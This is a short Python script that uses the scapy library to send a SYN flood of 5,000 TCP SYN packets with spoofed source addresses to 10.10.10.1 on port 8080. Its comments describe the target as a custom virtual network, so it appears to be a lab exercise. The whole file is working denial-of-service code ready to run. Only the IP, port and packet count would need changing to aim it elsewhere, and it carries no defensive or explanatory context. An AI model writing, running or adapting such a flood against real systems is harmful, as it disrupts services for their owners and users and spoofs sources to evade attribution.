from scapy.all import *
import random

def syn_flood(target_ip, target_port, packet_count):
    print(f"SYN Flooding {target_ip}:{target_port} on a non-standard network!")

    for _ in range(packet_count):
        src_ip = f"10.10.10.{random.randint(2, 254)}"  # Random IP in the virtual network
        src_port = random.randint(1024, 65535)  # Random source port

        # Create SYN packet
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        send(packet, verbose=False)

        print(f"{src_ip}\t{target_ip}\t{len(packet)}")

    print("SYN Flood attack completed.")

if __name__ == "__main__":
    target_ip = "10.10.10.1"  # Targeting our custom network
    target_port = 8080  # Web server port

    syn_flood(target_ip, target_port, 5000)
